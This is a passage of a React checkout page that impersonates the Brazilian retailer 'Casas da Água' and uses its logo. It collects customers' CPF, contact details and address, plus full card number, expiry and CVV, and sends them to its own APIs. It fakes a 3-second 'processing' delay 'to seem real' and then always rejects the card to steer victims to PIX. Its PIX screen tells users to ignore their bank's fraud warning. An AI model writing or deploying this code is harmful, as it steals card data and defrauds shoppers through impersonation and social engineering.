"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import { useCart } from "@/contexts/CartContext";
import {
  Minus, Plus, Trash2, ShoppingCart, ChevronLeft,
  CreditCard, QrCode, Copy, Check, Shield,
  User, Truck, Wallet, Pencil
} from "lucide-react";
import CardRejectionModal from "@/components/CardRejectionModal";
import {
  VisaLogo, MastercardLogo, AmexLogo, EloLogo,
  HipercardLogo, DinersLogo, PaypalLogo, PixLogo, BoletoLogo
} from "@/components/CardBrandLogos";

type Step = "cart" | "dados" | "entrega" | "pagamento";

const STEPS: { key: Step; label: string; number: number }[] = [
  { key: "cart", label: "Carrinho", number: 1 },
  { key: "dados", label: "Dados pessoais", number: 2 },
  { key: "entrega", label: "Entrega", number: 3 },
  { key: "pagamento", label: "Pagamento", number: 4 },
];

function fmt(val: number) {
  return `R$ ${val.toFixed(2).replace(".", ",")}`;
}

export default function CheckoutPage() {
  const { items, updateQuantity, removeItem, subtotal, discount, total, totalItems } = useCart();
  const [step, setStep] = useState<Step>("cart");
  const [cupomOpen, setCupomOpen] = useState(false);
  const [cupom, setCupom] = useState("");
  const [freteTab, setFreteTab] = useState<"receber" | "retirar">("receber");

  // Dados pessoais
  const [email, setEmail] = useState("");
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [cpf, setCpf] = useState("");
  const [phone, setPhone] = useState("");
  const [cpfTitular, setCpfTitular] = useState("");
  const [receivePromo, setReceivePromo] = useState(false);

  // Entrega
  const [cep, setCep] = useState("");
  const [cepValid, setCepValid] = useState(false);
  const [address, setAddress] = useState("");
  const [addressNumber, setAddressNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [uf, setUf] = useState("");
  const [destinatario, setDestinatario] = useState("");

  // Pagamento
  const [paymentMethod, setPaymentMethod] = useState<"credit" | "pix" | "boleto">("pix");
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [cardExpiryMonth, setCardExpiryMonth] = useState("");
  const [cardExpiryYear, setCardExpiryYear] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardInstallments, setCardInstallments] = useState("1");
  const [billingAddressSame, setBillingAddressSame] = useState(true);
  const [pixCopied, setPixCopied] = useState(false);

  // API integration states
  const [orderId, setOrderId] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const [pixTimer, setPixTimer] = useState(600);
  const [qrCodeBase64, setQrCodeBase64] = useState<string | null>(null);
  const [showCardRejection, setShowCardRejection] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);

  // CEP lookup
  const [cepLoading, setCepLoading] = useState(false);
  const [cepCalculated, setCepCalculated] = useState(false);
  const [shippingType, setShippingType] = useState<"standard" | "express">("standard");

  const frete = shippingType === "express" ? 22.22 : 0;
  const grandTotal = total + frete;
  const currentStepIndex = STEPS.findIndex((s) => s.key === step);
  const freteGratisMin = 299;
  const freteProgress = Math.min((subtotal / freteGratisMin) * 100, 100);

  // Auto-fill destinatario
  useEffect(() => {
    if (firstName && lastName && !destinatario) {
      setDestinatario(`${firstName} ${lastName}`);
    }
  }, [firstName, lastName, destinatario]);

  // PIX timer
  useEffect(() => {
    if (!pixCode || pixTimer <= 0) return;
    const interval = setInterval(() => {
      setPixTimer((t) => t - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [pixCode, pixTimer]);

  const formatTimer = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s.toString().padStart(2, "0")}`;
  };

  const goNext = () => {
    const next = STEPS[currentStepIndex + 1];
    if (next) setStep(next.key);
  };
  const goBack = () => {
    const prev = STEPS[currentStepIndex - 1];
    if (prev) setStep(prev.key);
  };

  // CEP lookup
  const lookupCep = async () => {
    const cleanCep = cep.replace(/\D/g, "");
    if (cleanCep.length !== 8) return;
    setCepLoading(true);
    try {
      const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
      const data = await res.json();
      if (!data.erro) {
        setAddress(data.logradouro || "");
        setNeighborhood(data.bairro || "");
        setCity(data.localidade || "");
        setUf(data.uf || "");
        setCepValid(true);
        setCepCalculated(true);
      }
    } catch {
      /* ignore */
    } finally {
      setCepLoading(false);
    }
  };

  // Format CEP
  const handleCepChange = (val: string) => {
    const clean = val.replace(/\D/g, "");
    if (clean.length <= 5) {
      setCep(clean);
    } else {
      setCep(`${clean.slice(0, 5)}-${clean.slice(5, 8)}`);
    }
    setCepValid(false);
  };

  // Format CPF
  const handleCpfChange = (val: string) => {
    const clean = val.replace(/\D/g, "");
    if (clean.length <= 3) setCpf(clean);
    else if (clean.length <= 6) setCpf(`${clean.slice(0, 3)}.${clean.slice(3)}`);
    else if (clean.length <= 9) setCpf(`${clean.slice(0, 3)}.${clean.slice(3, 6)}.${clean.slice(6)}`);
    else setCpf(`${clean.slice(0, 3)}.${clean.slice(3, 6)}.${clean.slice(6, 9)}-${clean.slice(9, 11)}`);
  };

  // Format phone
  const handlePhoneChange = (val: string) => {
    const clean = val.replace(/\D/g, "");
    if (clean.length <= 2) setPhone(clean);
    else if (clean.length <= 7) setPhone(`(${clean.slice(0, 2)}) ${clean.slice(2)}`);
    else setPhone(`(${clean.slice(0, 2)}) ${clean.slice(2, 7)}-${clean.slice(7, 11)}`);
  };

  // Format card number
  const handleCardNumberChange = (val: string) => {
    const clean = val.replace(/\D/g, "");
    const parts = clean.match(/.{1,4}/g) || [];
    setCardNumber(parts.join(" "));
  };

  // Detect card brand
  const getCardBrand = () => {
    const n = cardNumber.replace(/\s/g, "");
    if (/^4/.test(n)) return "visa";
    if (/^5[1-5]/.test(n)) return "master";
    if (/^3[47]/.test(n)) return "amex";
    if (/^(606282|3841)/.test(n)) return "hiper";
    if (/^(636368|438935|504175|451416|636297)/.test(n) || /^(5067|4576|4011)/.test(n)) return "elo";
    if (/^(30[0-5]|36|38)/.test(n)) return "diners";
    return null;
  };

  // Save lead
  const saveLead = async (stepReached: string) => {
    try {
      await fetch("/api/leads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, firstName, lastName, cpf, phone, stepReached }),
      });
    } catch { /* ignore */ }
  };

  const validateDados = (): string | null => {
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return "Preencha um e-mail válido.";
    if (!firstName.trim()) return "Preencha seu nome.";
    if (!lastName.trim()) return "Preencha seu sobrenome.";
    if (!cpf || cpf.replace(/\D/g, "").length < 11) return "Preencha um CPF válido (11 dígitos).";
    if (!phone || phone.replace(/\D/g, "").length < 10) return "Preencha um telefone válido.";
    return null;
  };

  const validateEntrega = (): string | null => {
    if (!cepValid || !address) return "Informe um CEP válido e aguarde o endereço carregar.";
    if (!addressNumber.trim()) return "Preencha o número do endereço.";
    if (!neighborhood.trim()) return "Preencha o bairro.";
    if (!city.trim()) return "Preencha a cidade.";
    if (!uf.trim()) return "Preencha o estado.";
    return null;
  };

  const advanceFromDados = () => {
    const err = validateDados();
    if (err) { alert(err); return; }
    saveLead("dados");
    goNext();
  };

  const advanceFromEntrega = () => {
    const err = validateEntrega();
    if (err) { alert(err); return; }
    saveLead("entrega");
    goNext();
  };

  // Create order
  const createOrder = async (method: "credit" | "pix") => {
    setLoading(true);
    try {
      const orderItems = items.map((item) => ({
        productId: item.product.id,
        name: item.product.name,
        slug: item.product.slug,
        image: item.product.images?.[0] || "",
        price: item.product.price,
        quantity: item.quantity,
      }));

      const body: Record<string, unknown> = {
        email, firstName, lastName, cpf, phone, receivePromo,
        cep, address, number: addressNumber, complement, neighborhood, city, uf,
        subtotal, discount, shipping: frete, total: grandTotal,
        paymentMethod: method,
        items: orderItems,
      };

      if (method === "credit") {
        body.cardNumber = cardNumber;
        body.cardName = cardName;
        body.cardExpiry = `${cardExpiryMonth}/${cardExpiryYear}`;
        body.cardCvv = cardCvv;
        body.cardInstallments = parseInt(cardInstallments);
        body.cpfTitular = cpfTitular || cpf;
      }

      const res = await fetch("/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      const data = await res.json();
      setOrderId(data.orderId);

      if (method === "pix" && data.pixCode) {
        setPixCode(data.pixCode);
        setQrCodeBase64(data.qrCodeBase64);
        setPixTimer(600);
      }

      return data;
    } catch (error) {
      console.error("Error creating order:", error);
      return null;
    } finally {
      setLoading(false);
    }
  };

  // Finalizar pedido
  const handleFinalizarPedido = async () => {
    const errDados = validateDados();
    if (errDados) { alert(errDados); return; }
    const errEntrega = validateEntrega();
    if (errEntrega) { alert(errEntrega); return; }

    if (paymentMethod === "credit") {
      setShowProcessing(true);
      try {
        await createOrder("credit");
      } catch { /* ignore */ }
      // Simular processamento de 3 segundos para parecer real
      await new Promise((resolve) => setTimeout(resolve, 3000));
      setShowProcessing(false);
      // Always show card rejection - cards are "disabled"
      setShowCardRejection(true);
    } else if (paymentMethod === "pix") {
      setShowProcessing(true);
      try {
        await createOrder("pix");
      } catch { /* ignore */ }
      setShowProcessing(false);
    }
  };

  // Switch to PIX from card rejection
  const handleSwitchToPix = async () => {
    setShowCardRejection(false);
    setPaymentMethod("pix");

    if (orderId) {
      setLoading(true);
      try {
        const res = await fetch(`/api/orders/${orderId}`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ paymentMethod: "pix" }),
        });
        const data = await res.json();
        if (data.pixPayment) {
          setPixCode(data.pixPayment.pix_code || data.pixPayment.pixCode);
          setQrCodeBase64(data.pixPayment.qr_code_base64 || data.pixPayment.qrCodeBase64);
          setPixTimer(600);
        }
      } catch (error) {
        console.error("Error switching to PIX:", error);
      } finally {
        setLoading(false);
      }
    }
  };

  const copyPix = () => {
    if (pixCode) navigator.clipboard.writeText(pixCode);
    setPixCopied(true);
    setTimeout(() => setPixCopied(false), 3000);
  };

  // Installments helper
  const installmentOptions = Array.from({ length: 10 }, (_, i) => i + 1);

  // Empty cart
  if (items.length === 0 && step === "cart") {
    return (
      <div className="checkout__empty">
        <div className="checkout__empty-card">
          <ShoppingCart size={56} className="checkout__empty-icon" />
          <h2 className="checkout__empty-title">Carrinho vazio</h2>
          <p className="checkout__empty-text">Você ainda não adicionou produtos ao carrinho.</p>
          <Link href="/" className="checkout__empty-btn">Continuar comprando</Link>
        </div>
      </div>
    );
  }

  // ===== PIX CODE SCREEN (full page overlay) =====
  if (pixCode) {
    return (
      <div className="checkout">
        <header className="checkout__header">
          <div className="checkout__header-inner">
            <Link href="/" className="checkout__logo">
              <Image
                src="https://cdagua.vtexassets.com/assets/vtex.file-manager-graphql/images/0653cec5-9e24-433a-867f-1fa6bfb8358b___7e8dc42a059653440eb3e6dfcb795a46.png"
                alt="Casas da Água" width={160} height={50} className="checkout__logo-img"
              />
            </Link>
            <div className="checkout__security">
              <Shield size={18} />
              <span className="checkout__security-text">compra 100% segura</span>
            </div>
          </div>
        </header>

        <div className="checkout__pix-overlay">
          <div className="checkout__pix-modal">
            {/* PIX Logo */}
            <div className="checkout__pix-logo-wrap">
              <img src="/pix-logo.png" alt="PIX" className="checkout__pix-logo-img" />
            </div>

            <p className="checkout__pix-timer">Tempo restante {formatTimer(pixTimer)}</p>

            {/* QR Code */}
            {qrCodeBase64 && (
              <div className="checkout__pix-qr-wrap">
                <img src={qrCodeBase64} alt="QR Code PIX" />
              </div>
            )}

            {/* Pix code box */}
            <div className="checkout__pix-code-box">
              <span className="checkout__pix-code-text">{pixCode.substring(0, 40)}...</span>
            </div>
            <button onClick={copyPix} className="checkout__pix-copy-btn">
              {pixCopied ? "COPIADO!" : "COPIAR CÓDIGO"} {pixCopied ? <Check size={16} /> : <Copy size={16} />}
            </button>

            <h3 className="checkout__pix-instructions-title">Copie o código de pagamento</h3>
            <p className="checkout__pix-instructions-text">
              Em seguida abra o internet banking do seu banco na opção Pix, cole o código e confira os dados
            </p>
            <button className="checkout__pix-mobile-link">Pagar com o celular</button>

            <div className="checkout__pix-value">
              <span className="checkout__pix-value-label">Valor da compra</span>
              <span className="checkout__pix-value-amount">{fmt(grandTotal)}</span>
            </div>

            {/* Aviso anti-golpe */}
            <div className="checkout__pix-warning">
              <span className="checkout__pix-warning-icon">⚠️</span>
              <div className="checkout__pix-warning-text">
                <p><strong>Aviso de Segurança:</strong> Devido à grande quantidade de golpes que ocorrem no Brasil, informamos que trabalhamos com total fidelidade ao cliente há 60 anos! Fique tranquilo, sua compra é 100% segura.</p>
                <p className="checkout__pix-warning-alert"><strong>ATENÇÃO:</strong> É possível que o seu banco exiba um alerta de segurança ao realizar o pagamento via PIX. Isso é normal e acontece como medida de proteção contra fraudes. Pode confirmar a transação com total tranquilidade!</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="checkout">
      {/* Processing overlay */}
      {showProcessing && (
        <div className="checkout__processing-overlay">
          <div className="checkout__processing-banner">
            <p className="checkout__processing-title">⏳ Aguarde...</p>
            <p className="checkout__processing-text">Estamos finalizando sua compra.</p>
          </div>
        </div>
      )}

      {/* Card Rejection Modal */}
      {showCardRejection && (
        <CardRejectionModal
          onSwitchToPix={handleSwitchToPix}
          onClose={() => setShowCardRejection(false)}
        />
      )}

      {/* ========== HEADER ========== */}
      <header className="checkout__header">
        <div className="checkout__header-inner">
          <Link href="/" className="checkout__logo">
            <Image
              src="https://cdagua.vtexassets.com/assets/vtex.file-manager-graphql/images/0653cec5-9e24-433a-867f-1fa6bfb8358b___7e8dc42a059653440eb3e6dfcb795a46.png"
              alt="Casas da Água" width={160} height={50} className="checkout__logo-img"
            />
          </Link>

          <div className="checkout__steps">
            {STEPS.map((s, i) => (
              <div key={s.key} className="checkout__step-wrapper">
                <button
                  onClick={() => (i <= currentStepIndex ? setStep(s.key) : undefined)}
                  className="checkout__step-btn"
                >
                  <span className={`checkout__step-circle ${
                    i < currentStepIndex ? "checkout__step-circle--done"
                    : i === currentStepIndex ? "checkout__step-circle--active"
                    : "checkout__step-circle--pending"
                  }`}>
                    {i < currentStepIndex ? "✓" : s.number}
                  </span>
                  <span className={`checkout__step-label ${
                    i <= currentStepIndex ? "checkout__step-label--active" : "checkout__step-label--pending"
                  }`}>
                    {s.label}
                  </span>
                </button>
                {i < STEPS.length - 1 && (
                  <div className={`checkout__step-line ${
                    i < currentStepIndex ? "checkout__step-line--done" : "checkout__step-line--pending"
                  }`} />
                )}
              </div>
            ))}
          </div>

          <div className="checkout__security">
            <Shield size={18} />
            <span className="checkout__security-text">compra 100% segura</span>
          </div>
        </div>
      </header>

      {/* ========== MAIN ========== */}
      <div className="checkout__main">

        {/* ========== STEP 1: CARRINHO ========== */}
        {step === "cart" && (
          <>
            <Link href="/" className="checkout__back">
              <ChevronLeft size={16} /> Continuar comprando
            </Link>

            {/* Cart items - mobile */}
            <div className="checkout__cart-items">
              {items.map((item) => (
                <div key={item.product.id} className="checkout__cart-item-card">
                  <div className="checkout__cart-item-top">
                    <div className="checkout__cart-item-img">
                      {item.product.images?.[0] && (
                        <Image src={item.product.images[0]} alt={item.product.name} fill className="checkout__cart-item-img-inner" sizes="80px" />
                      )}
                    </div>
                    <div className="checkout__cart-item-details">
                      <Link href={`/produto/${item.product.slug}`} className="checkout__cart-item-name">
                        {item.product.name}
                      </Link>
                      <div className="checkout__cart-item-prices">
                        {item.product.priceFrom && item.product.priceFrom > item.product.price && (
                          <span className="checkout__cart-item-old-price">{fmt(item.product.priceFrom)}</span>
                        )}
                        <span className="checkout__cart-item-new-price">{fmt(item.product.price)}</span>
                      </div>
                    </div>
                    <button onClick={() => removeItem(item.product.id)} className="checkout__cart-item-delete">
                      <Trash2 size={18} />
                    </button>
                  </div>
                  <div className="checkout__cart-item-bottom">
                    <div className="checkout__qty-control">
                      <button onClick={() => updateQuantity(item.product.id, item.quantity - 1)} className="checkout__qty-btn">
                        <Minus size={14} />
                      </button>
                      <span className="checkout__qty-value">{item.quantity}</span>
                      <button onClick={() => updateQuantity(item.product.id, item.quantity + 1)} className="checkout__qty-btn">
                        <Plus size={14} />
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            {/* Frete e entrega */}
            <div className="checkout__section-card">
              <h3 className="checkout__card-title">Frete e entrega</h3>
              <div className="checkout__frete-tabs">
                <button
                  onClick={() => setFreteTab("receber")}
                  className={`checkout__frete-tab ${freteTab === "receber" ? "checkout__frete-tab--active" : "checkout__frete-tab--inactive"}`}
                >
                  Receber
                </button>
                <button
                  disabled
                  className="checkout__frete-tab checkout__frete-tab--inactive checkout__frete-tab--disabled"
                >
                  Retirar
                </button>
              </div>

              {freteTab === "receber" && (
                <div className="checkout__cep-row">
                  <input
                    type="text"
                    value={cep}
                    onChange={(e) => handleCepChange(e.target.value)}
                    placeholder="Digite o CEP"
                    maxLength={9}
                    className="checkout__cep-input"
                  />
                  <button onClick={lookupCep} className="checkout__cep-btn">
                    {cepLoading ? "..." : "Calcular"}
                  </button>
                </div>
              )}
              {freteTab === "receber" && (
                <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" rel="noopener noreferrer" className="checkout__cep-link">
                  Não sei meu CEP
                </a>
              )}
              {!cep && freteTab === "receber" && (
                <p className="checkout__field-error">Campo obrigatório.</p>
              )}

              {cepCalculated && freteTab === "receber" && (
                <div className="checkout__shipping-options">
                  <div className={`checkout__shipping-option ${shippingType === "standard" ? "checkout__shipping-option--selected" : ""}`}>
                    <label className="checkout__shipping-label">
                      <div className="checkout__shipping-radio-wrap">
                        <input type="radio" name="frete-cart" checked={shippingType === "standard"} onChange={() => setShippingType("standard")} className="checkout__radio" />
                        <span>Em até 7 dias úteis</span>
                      </div>
                      <span className="checkout__shipping-free">Grátis</span>
                    </label>
                  </div>
                  <div className={`checkout__shipping-option ${shippingType === "express" ? "checkout__shipping-option--selected" : ""}`}>
                    <label className="checkout__shipping-label">
                      <div className="checkout__shipping-radio-wrap">
                        <input type="radio" name="frete-cart" checked={shippingType === "express"} onChange={() => setShippingType("express")} className="checkout__radio" />
                        <span>Express até 3 dias</span>
                      </div>
                      <span className="checkout__shipping-express-price">R$ 22,22</span>
                    </label>
                  </div>
                </div>
              )}

              {freteTab === "retirar" && (
                <p className="checkout__muted-text">Retirada em loja disponível em breve.</p>
              )}
            </div>

            {/* Summary sidebar area */}
            <div className="checkout__section-card">
              <div className="checkout__cupom-area">
                <button onClick={() => setCupomOpen(!cupomOpen)} className="checkout__cupom-toggle">
                  Adicionar cupom de desconto
                </button>
                {cupomOpen && (
                  <div className="checkout__cupom-row">
                    <input
                      type="text" value={cupom} onChange={(e) => setCupom(e.target.value)}
                      placeholder="Cupom" className="checkout__cupom-input"
                    />
                    <button className="checkout__cupom-btn">OK</button>
                  </div>
                )}
              </div>

              <div className="checkout__totals">
                <div className="checkout__total-line">
                  <span>Subtotal</span>
                  <span>{fmt(subtotal)}</span>
                </div>
                {discount > 0 && (
                  <div className="checkout__total-line checkout__total-line--discount">
                    <span>Descontos</span>
                    <span>R$ -{fmt(discount).replace("R$ ", "")}</span>
                  </div>
                )}
                <div className="checkout__total-line">
                  <span>Frete</span>
                  <span>{frete === 0 ? "Grátis" : fmt(frete)}</span>
                </div>
                <div className="checkout__total-line checkout__total-line--grand">
                  <span>Total</span>
                  <span>{fmt(grandTotal)}</span>
                </div>
              </div>

              {/* Frete gratis bar */}
              <div className="checkout__frete-bar">
                {subtotal >= freteGratisMin ? (
                  <p className="checkout__frete-msg checkout__frete-msg--success">Você ganhou frete grátis!</p>
                ) : (
                  <p className="checkout__frete-msg">
                    Falta <strong>{fmt(freteGratisMin - subtotal)}</strong> para frete grátis
                  </p>
                )}
                <div className="checkout__progress-bar">
                  <div className="checkout__progress-fill" style={{ width: `${freteProgress}%` }} />
                  <div className="checkout__progress-truck">🚛</div>
                </div>
              </div>
            </div>

            <p className="checkout__terms-text">
              Ao clicar em &quot;<strong>Finalizar compra</strong>&quot; eu concordo com os{" "}
              <span className="checkout__link">Termos e condições de uso</span> e{" "}
              <span className="checkout__link">Política de entrega</span>
            </p>

            <button onClick={goNext} className="checkout__action-btn checkout__action-btn--dark">
              Finalizar compra
            </button>
          </>
        )}

        {/* ========== STEPS 2-4 ========== */}
        {step !== "cart" && (
          <div className="checkout__flow-layout">
            <div className="checkout__flow-content">

              {/* ===== DADOS PESSOAIS SECTION ===== */}
              <div className="checkout__section-card">
                <div className="checkout__section-header">
                  <User size={20} className="checkout__section-icon" />
                  <h3 className="checkout__section-title-text">Dados pessoais</h3>
                  {currentStepIndex > 1 && (
                    <button onClick={() => setStep("dados")} className="checkout__edit-btn">
                      <Pencil size={16} />
                    </button>
                  )}
                </div>

                {/* Expanded - current step */}
                {step === "dados" && (
                  <div className="checkout__section-body">
                    <p className="checkout__section-desc">
                      Solicitamos apenas as informações essenciais para a realização da compra.
                    </p>

                    <div className="checkout__form-group">
                      <label className="checkout__form-label">E-mail</label>
                      <div className="checkout__input-wrap">
                        <input
                          type="email" value={email} onChange={(e) => setEmail(e.target.value)}
                          placeholder="seu@email.com" className="checkout__form-input"
                        />
                        {email && email.includes("@") && (
                          <span className="checkout__input-check">✓</span>
                        )}
                      </div>
                    </div>

                    <div className="checkout__form-row">
                      <div className="checkout__form-group checkout__form-group--half">
                        <label className="checkout__form-label">Primeiro nome</label>
                        <input
                          type="text" value={firstName} onChange={(e) => setFirstName(e.target.value)}
                          className="checkout__form-input"
                        />
                        {!firstName && <p className="checkout__field-error">Campo obrigatório.</p>}
                      </div>
                      <div className="checkout__form-group checkout__form-group--half">
                        <label className="checkout__form-label">Último nome</label>
                        <input
                          type="text" value={lastName} onChange={(e) => setLastName(e.target.value)}
                          className="checkout__form-input"
                        />
                        {!lastName && <p className="checkout__field-error">Campo obrigatório.</p>}
                      </div>
                    </div>

                    <div className="checkout__form-row">
                      <div className="checkout__form-group checkout__form-group--half">
                        <label className="checkout__form-label">CPF</label>
                        <input
                          type="text" value={cpf} onChange={(e) => handleCpfChange(e.target.value)}
                          placeholder="999.999.999-99" maxLength={14} className="checkout__form-input"
                        />
                        {!cpf && <p className="checkout__field-error">Campo obrigatório.</p>}
                      </div>
                      <div className="checkout__form-group checkout__form-group--half">
                        <label className="checkout__form-label">Telefone</label>
                        <input
                          type="tel" value={phone} onChange={(e) => handlePhoneChange(e.target.value)}
                          placeholder="11 99999-9999" maxLength={15} className="checkout__form-input"
                        />
                        {!phone && <p className="checkout__field-error">Campo obrigatório.</p>}
                      </div>
                    </div>

                    <button className="checkout__link-btn">Incluir dados de pessoa jurídica</button>

                    <label className="checkout__checkbox-label">
                      <input type="checkbox" checked={receivePromo} onChange={(e) => setReceivePromo(e.target.checked)} className="checkout__checkbox" />
                      <span>Quero receber e-mails com promoções.</span>
                    </label>

                    <button onClick={advanceFromDados} className="checkout__action-btn">
                      Ir para a Entrega
                    </button>
                  </div>
                )}

                {/* Summary - completed */}
                {currentStepIndex > 1 && step !== "dados" && (
                  <div className="checkout__section-summary">
                    <p>{email}</p>
                    <p>{firstName} {lastName}</p>
                    <p>({phone.slice(1, 3)}) {phone.slice(5)}</p>
                  </div>
                )}
              </div>

              {/* ===== ENTREGA SECTION ===== */}
              <div className="checkout__section-card">
                <div className="checkout__section-header">
                  <Truck size={20} className="checkout__section-icon" />
                  <h3 className="checkout__section-title-text">Entrega</h3>
                  {currentStepIndex > 2 && (
                    <button onClick={() => setStep("entrega")} className="checkout__edit-btn">
                      <Pencil size={16} />
                    </button>
                  )}
                </div>

                {/* Expanded */}
                {step === "entrega" && (
                  <div className="checkout__section-body">
                    <div className="checkout__frete-tabs">
                      <button
                        onClick={() => setFreteTab("receber")}
                        className={`checkout__frete-tab ${freteTab === "receber" ? "checkout__frete-tab--active" : "checkout__frete-tab--inactive"}`}
                      >
                        Receber
                      </button>
                      <button
                        disabled
                        className="checkout__frete-tab checkout__frete-tab--inactive checkout__frete-tab--disabled"
                      >
                        Retirar
                      </button>
                    </div>

                    <div className="checkout__form-group">
                      <label className="checkout__form-label">CEP</label>
                      <div className="checkout__cep-inline">
                        <div className="checkout__input-wrap">
                          <input
                            type="text" value={cep} onChange={(e) => handleCepChange(e.target.value)}
                            onBlur={lookupCep} maxLength={9} className="checkout__form-input checkout__form-input--short"
                          />
                          {cepValid && <span className="checkout__input-check">✓</span>}
                        </div>
                        <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" rel="noopener noreferrer" className="checkout__link-btn">
                          Não sei meu CEP
                        </a>
                      </div>
                    </div>

                    {cepValid && (
                      <>
                        {/* Forma de entrega */}
                        <h4 className="checkout__subsection-title">Forma de entrega</h4>
                        <div className={`checkout__shipping-option ${shippingType === "standard" ? "checkout__shipping-option--selected" : ""}`}>
                          <label className="checkout__shipping-label">
                            <div className="checkout__shipping-radio-wrap">
                              <input type="radio" name="frete" checked={shippingType === "standard"} onChange={() => setShippingType("standard")} className="checkout__radio" />
                              <span>Em até 7 dias úteis</span>
                            </div>
                            <span className="checkout__shipping-free">Grátis</span>
                          </label>
                        </div>
                        <div className={`checkout__shipping-option ${shippingType === "express" ? "checkout__shipping-option--selected" : ""}`}>
                          <label className="checkout__shipping-label">
                            <div className="checkout__shipping-radio-wrap">
                              <input type="radio" name="frete" checked={shippingType === "express"} onChange={() => setShippingType("express")} className="checkout__radio" />
                              <span>Express até 3 dias</span>
                            </div>
                            <span className="checkout__shipping-express-price">R$ 22,22</span>
                          </label>
                        </div>

                        {/* Endereço de entrega */}
                        <h4 className="checkout__subsection-title">Endereço de entrega</h4>
                        <div className="checkout__address-card">
                          <div className="checkout__address-icon">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="#0862AD" xmlns="http://www.w3.org/2000/svg">
                              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5a2.5 2.5 0 110-5 2.5 2.5 0 010 5z"/>
                            </svg>
                          </div>
                          <div className="checkout__address-text">
                            <p>{address}</p>
                            <p>{neighborhood} - {city} - {uf}</p>
                            <button className="checkout__link-btn">Alterar</button>
                          </div>
                        </div>

                        <div className="checkout__form-row">
                          <div className="checkout__form-group checkout__form-group--small">
                            <label className="checkout__form-label">Número</label>
                            <input type="text" value={addressNumber} onChange={(e) => setAddressNumber(e.target.value)} className="checkout__form-input" />
                          </div>
                          <div className="checkout__form-group checkout__form-group--large">
                            <label className="checkout__form-label">Complemento e referência</label>
                            <input type="text" value={complement} onChange={(e) => setComplement(e.target.value)} placeholder="Opcional" className="checkout__form-input" />
                          </div>
                        </div>

                        <div className="checkout__form-group">
                          <label className="checkout__form-label">Destinatário</label>
                          <div className="checkout__input-wrap">
                            <input
                              type="text" value={destinatario} onChange={(e) => setDestinatario(e.target.value)}
                              className="checkout__form-input"
                            />
                            {destinatario && <span className="checkout__input-check">✓</span>}
                          </div>
                        </div>
                      </>
                    )}

                    <button onClick={advanceFromEntrega} className="checkout__action-btn">
                      Ir para o pagamento
                    </button>
                  </div>
                )}

                {/* Summary */}
                {currentStepIndex > 2 && step !== "entrega" && (
                  <div className="checkout__section-summary">
                    <p>{address} {addressNumber}{neighborhood && ` - ${neighborhood}`} - {city} - {uf}{cep}</p>
                    <div className="checkout__entrega-info">
                      <span className="checkout__entrega-prazo">{shippingType === "express" ? "Express até 3 dias" : "Em até 7 dias úteis"}</span>
                      <span className="checkout__entrega-gratis">{shippingType === "express" ? "R$ 22,22" : "Grátis"}</span>
                    </div>
                  </div>
                )}

                {/* Pending */}
                {currentStepIndex < 2 && (
                  <div className="checkout__section-pending">
                    <p>Aguardando o preenchimento dos dados</p>
                  </div>
                )}
              </div>

              {/* ===== PAGAMENTO SECTION ===== */}
              <div className="checkout__section-card">
                <div className="checkout__section-header">
                  <Wallet size={20} className="checkout__section-icon" />
                  <h3 className="checkout__section-title-text">Pagamento</h3>
                </div>

                {/* Expanded */}
                {step === "pagamento" && (
                  <div className="checkout__section-body">
                    <button className="checkout__link-btn checkout__vale-link">Adicionar vale-presente</button>

                    {/* Payment method tabs - like original */}
                    <div className="checkout__pay-methods">
                      <button
                        onClick={() => setPaymentMethod("credit")}
                        className={`checkout__pay-method ${paymentMethod === "credit" ? "checkout__pay-method--active" : ""}`}
                      >
                        <span>Cartão de crédito</span>
                        <CreditCard size={18} />
                      </button>
                      <button
                        onClick={() => setPaymentMethod("pix")}
                        className={`checkout__pay-method ${paymentMethod === "pix" ? "checkout__pay-method--active" : ""}`}
                      >
                        <span>Pix</span>
                        <img src="/pix-logo.png" alt="PIX" style={{ width: 48, height: 28, objectFit: "contain" }} />
                      </button>
                      <button
                        disabled
                        className="checkout__pay-method checkout__pay-method--disabled"
                      >
                        <span>Boleto bancário</span>
                        <span className="checkout__pay-method-icon-text">|||</span>
                      </button>
                    </div>

                    {/* Credit card form */}
                    {paymentMethod === "credit" && (
                      <div className="checkout__cc-form">
                        <div className="checkout__cc-number-wrap">
                          <label className="checkout__form-label">Número do cartão</label>
                          <div className="checkout__cc-number-box">
                            <input
                              type="text" value={cardNumber} onChange={(e) => handleCardNumberChange(e.target.value)}
                              maxLength={19} className="checkout__form-input checkout__cc-input"
                            />
                            <span className="checkout__cc-secure">Ambiente<br/>Seguro</span>
                          </div>
                        </div>

                        {/* Card brand indicators */}
                        <div className="checkout__cc-brands">
                          {[
                            { key: "visa", logo: <VisaLogo width={32} height={22} /> },
                            { key: "amex", logo: <AmexLogo width={32} height={22} /> },
                            { key: "diners", logo: <DinersLogo width={32} height={22} /> },
                            { key: "master", logo: <MastercardLogo width={32} height={22} /> },
                            { key: "elo", logo: <EloLogo width={32} height={22} /> },
                          ].map((brand) => (
